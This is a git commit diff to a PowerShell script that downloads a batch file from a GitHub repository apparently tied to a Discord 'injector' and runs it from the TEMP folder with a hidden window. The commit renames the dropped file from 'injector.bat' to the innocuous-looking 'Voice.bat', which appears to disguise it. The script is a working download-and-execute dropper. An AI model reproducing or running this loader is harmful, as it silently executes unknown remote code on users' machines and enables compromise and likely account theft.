def96b0d55e1e446d93599f219d139b80deaf478
kyara.sls <102626807+IStrawI@users.noreply.github.com>
2024-01-27 12:32:48 +0100

    Update index.ps1

--- index.ps1
+++ index.ps1
@@ -1,3 +1,3 @@
-iwr -useb https://raw.githubusercontent.com/IStrawI/botdiscord/main/sam.bat -o $env:TEMP\injector.bat
+iwr -useb https://raw.githubusercontent.com/IStrawI/botdiscord/main/sam.bat -o $env:TEMP\Voice.bat
 Start-Sleep -s 1
-saps $env:TEMP\injector.bat -WindowStyle Hidden
+saps $env:TEMP\Voice.bat -WindowStyle Hidden
